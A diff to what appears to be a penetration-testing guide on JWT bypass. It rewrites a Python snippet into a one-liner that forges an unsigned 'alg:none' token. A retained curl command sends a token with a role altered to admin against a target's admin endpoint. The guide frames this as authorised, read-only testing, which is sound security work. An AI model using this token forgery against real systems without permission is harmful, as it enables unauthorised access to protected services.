@@ -155,15 +155,9 @@ Demonstrate a read-only JWT bypass without modifying data or creating persistent
 echo '<token>' | cut -d. -f2 | base64 -d | python3 -m json.tool
 
 # Safe: Test algorithm none with a read-only proof
-# Craft a token that claims a read-only role
-python3 << 'EOF'
-import base64, json
-
-header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
-payload = base64.urlsafe_b64encode(json.dumps({"sub":"test","role":"viewer","iat":1700000000}).encode()).rstrip(b'=').decode()
-token = f"{header}.{payload}."
-print(f"Token: {token}")
-EOF
+# Craft a token that claims a read-only role (single-line -c form: multi-line
+# here-documents are brittle inside command wrappers and burst files)
+python3 -c 'import base64,json; h=base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode(); p=base64.urlsafe_b64encode(json.dumps({"sub":"test","role":"viewer","iat":1700000000}).encode()).rstrip(b"=").decode(); print(f"Token: {h}.{p}.")'
 
 # Safe: Modify a claim (e.g. role:user -> role:admin) and test read-only access
 curl -s -o /dev/null -w "HTTP %{http_code}\n" -H 'Authorization: Bearer <modified_token>' 'https://target.com/admin'
